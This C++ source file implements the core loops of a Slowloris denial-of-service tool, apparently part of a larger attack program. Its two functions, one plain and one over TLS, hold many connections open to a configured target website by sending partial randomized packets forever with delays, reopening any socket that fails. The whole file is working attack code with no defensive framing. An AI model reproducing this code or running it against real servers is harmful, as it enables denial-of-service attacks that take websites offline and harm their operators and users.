#include <netdb.h>
#include <cstring>
#include <csignal>
#include <unistd.h>
#include <array>
#include <openssl/ssl.h>
#include "Slowloris.hpp"

void Slowloris::attack(const int *id) {
    int r;
    std::vector<int> sockets;
    std::vector<bool> keep_alive;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
        keep_alive.push_back(false);
    }
    signal(SIGPIPE, &Slowloris::broke);
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                keep_alive[x] = false;
            }
            const char *packet = Randomizer::randomPacket(conf, keep_alive[x]);
            if((r = write_socket(sockets[x], packet, static_cast<int>(strlen(packet)))) < 0){
                cleanup(&sockets[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                keep_alive[x] = false;
            }else{
                keep_alive[x] = true;
                if(conf->GetResponse){
                    read_socket(sockets[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
            message = std::to_string(*id) + ": Voly Sent";
            logger->Log(&message, Logger::Info);
            usleep(static_cast<__useconds_t>(conf->delay));
        }
    }
}

void Slowloris::attack_ssl(const int *id) {
    int r;
    std::vector<int> sockets;
    std::vector<SSL_CTX *> CTXs;
    std::vector<SSL *> SSLs;
    std::vector<bool> keep_alive;
    for (int x = 0; x < conf->CONNECTIONS; x++) {
        sockets.push_back(0);
        SSLs.push_back(nullptr);
        CTXs.push_back(nullptr);
        keep_alive.push_back(false);
    }
    signal(SIGPIPE, &Slowloris::broke);
    while(true) {
        static std::string message;
        for (int x = 0; x < conf->CONNECTIONS; x++) {
            if(!sockets[x]){
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                keep_alive[x] = false;
            }
            const char *packet = Randomizer::randomPacket(conf, keep_alive[x]);
            if((r = write_socket(SSLs[x], packet, static_cast<int>(strlen(packet)))) < 0){
                cleanup(SSLs[x], &sockets[x], CTXs[x]);
                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                CTXs[x] = InitCTX();
                SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                keep_alive[x] = false;
            }else{
                keep_alive[x] = true;
                if(conf->GetResponse){
                    read_socket(SSLs[x]);
                }
                message = std::string("Socket[") + std::to_string(x) + "->"
                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
                logger->Log(&message, Logger::Info);
                message = std::to_string(*id) + ": Voly Sent";
                logger->Log(&message, Logger::Info);
            }
            message = std::to_string(*id) + ": Voly Sent";
            logger->Log(&message, Logger::Info);
            usleep(static_cast<__useconds_t>(conf->delay));
        }
    }
}

